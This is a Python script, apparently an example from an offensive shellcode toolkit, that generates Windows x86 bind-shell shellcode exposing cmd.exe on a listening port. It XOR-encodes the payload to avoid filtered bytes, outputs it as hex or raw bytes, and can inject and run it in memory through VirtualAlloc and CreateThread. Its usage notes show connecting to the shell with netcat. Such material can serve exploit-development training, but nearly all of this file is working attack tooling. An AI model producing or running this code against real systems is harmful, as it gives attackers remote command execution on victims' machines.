#!/usr/bin/env -S uv run
"""
Example 03 — Bind shell using bindshell_code() from the toolkit.

Bind shell flow:
  - kernel32: LoadLibraryA, CreateProcessA, TerminateProcess
  - ws2_32: WSAStartup, WSASocketA, bind, listen, accept
  - CreateProcessA("cmd.exe") with the accepted socket wired to stdio

New concepts over Example 02:
  - bindshell_code() — server-side socket, no outbound connection needed
  - snippet_sockaddr_bind() handles the sockaddr_in layout for 0.0.0.0:<port>
  - Port encoding: encode_port() warns if the port number produces null bytes
    (e.g. port 256 = 0x0100 → has a null byte in network byte order)
  - custom_code() lets you specify exactly which functions to resolve if you
    want to add your own payloads after the bind/listen/accept

Usage:
    uv run Examples/03_bindshell.py --port 4444
    uv run Examples/03_bindshell.py --port 4444 --bad 000a0d --asm
    uv run Examples/03_bindshell.py --port 4444 --hex
    uv run Examples/03_bindshell.py --port 4444 --run   (Windows)

Catch the shell:
    nc <target_ip> 4444
"""
import argparse
import ctypes
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from Tools.shellcode_x86_win import assemble, bindshell_code, encode_port
from Tools.shellcode_x86_win.assembler import check_bad_chars


def xor_encode(sc, bad_chars):
    bad = set(bad_chars)
    for k in range(1, 256):
        if k in bad:
            continue
        encoded = bytes(b ^ k for b in sc)
        if not any(b in bad for b in encoded):
            stub = (
                f"decoder:\n    jmp  get_sc\ngot_sc:\n    pop  edi\n"
                f"    mov  ecx, {hex(len(encoded))}\ndecode_loop:\n"
                f"    xor  byte ptr [edi + ecx - 1], {hex(k)}\n"
                f"    loop decode_loop\n    jmp  edi\nget_sc:\n    call got_sc\n"
            )
            stub_sc, _ = assemble(stub)
            return bytes(stub_sc) + encoded, k
    raise ValueError("No single-byte XOR key avoids all bad bytes")


def check_port(port) -> None:
    _, has_null = encode_port(port)
    if has_null:
        print(f"[!] Port {port} contains a null byte in network byte order — choose another port")
        sys.exit(1)


def build(port: int, algo: str, rot: int, bad: bytes):
    asm, slots = bindshell_code(port, algo, rot)
    sc, count = assemble(asm)
    sc = bytes(sc)
    print(f"[*] Assembled: {count} instructions, {len(sc)} bytes")

    hits = check_bad_chars(sc, bad) if bad else []
    if hits:
        print(f"[*] {len(hits)} bad byte(s) — XOR encoding")
        sc, key = xor_encode(sc, bad)
        print(f"[*] Encoded size: {len(sc)} bytes  key=0x{key:02x}")
    elif bad:
        print(f"[*] No bad bytes found — raw shellcode is clean")

    return sc, asm


def print_hex(sc: bytes) -> None:
    print(f'\n# {len(sc)} bytes')
    print('"' + "".join(f"\\x{b:02x}" for b in sc) + '"')


def run(sc: bytes) -> None:
    buf = bytearray(sc)
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0), ctypes.c_int(len(buf)),
        ctypes.c_int(0x3000), ctypes.c_int(0x40))
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_int(ptr),
        (ctypes.c_char * len(buf)).from_buffer(buf),
        ctypes.c_int(len(buf)))
    print(f"\n[*] Shellcode at {hex(ptr)}")
    input("Press ENTER to execute (then: nc <this_host> {port})...")
    ht = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr),
        ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


def main() -> None:
    ap = argparse.ArgumentParser(description="Example 03: Bind shell via toolkit builder")
    ap.add_argument("--port",  default=4444, type=int)
    ap.add_argument("--algo",  default="ror", help="ror | rolxor")
    ap.add_argument("--rot",   default=13,  type=int)
    ap.add_argument("--bad",   default="",  help="Bad bytes hex, e.g. 000a0d")
    ap.add_argument("--asm",   action="store_true", help="Print ASM source")
    ap.add_argument("--hex",   action="store_true", help="Print hex string")
    ap.add_argument("--out",   default="",  help="Write raw bytes to file")
    ap.add_argument("--run",   action="store_true", help="Execute on Windows")
    args = ap.parse_args()

    bad = bytes.fromhex(args.bad) if args.bad else b""

    check_port(args.port)
    print(f"[*] Bind port: {args.port}  algo={args.algo}-{args.rot}")

    asm, _ = bindshell_code(args.port, args.algo, args.rot)
    if args.asm:
        print(asm)
        return

    try:
        sc, asm = build(args.port, args.algo, args.rot, bad)
    except SystemExit:
        print("[!] keystone-engine not installed — use --asm to view source")
        return

    if args.hex or (not args.out and not args.run):
        print_hex(sc)

    if args.out:
        Path(args.out).write_bytes(sc)
        print(f"[+] Wrote {len(sc)} bytes → {args.out}")

    if args.run:
        if sys.platform != "win32":
            print("[!] --run requires Windows")
            return
        run(sc)


if __name__ == "__main__":
    main()
